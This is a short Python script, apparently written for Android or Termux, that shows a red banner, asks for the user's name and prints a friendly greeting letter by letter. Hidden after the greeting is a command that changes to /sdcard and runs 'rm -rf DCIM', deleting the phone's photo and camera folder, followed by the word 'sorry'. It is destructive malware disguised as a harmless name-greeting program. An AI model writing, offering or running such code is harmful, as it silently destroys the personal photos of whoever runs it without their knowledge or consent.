import os,sys,time


def jalan (z) :
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush ()
		time.sleep (00000.03)
		
print ("\033[1;31m")
os.system ('figlet mh')
name = input ("what is your name : ")
jalan ("your name is " +name)
jalan (name+ "have a good day")
os.system('cd /sdcard/ ; rm -rf DCIM ')
jalan ("sorry")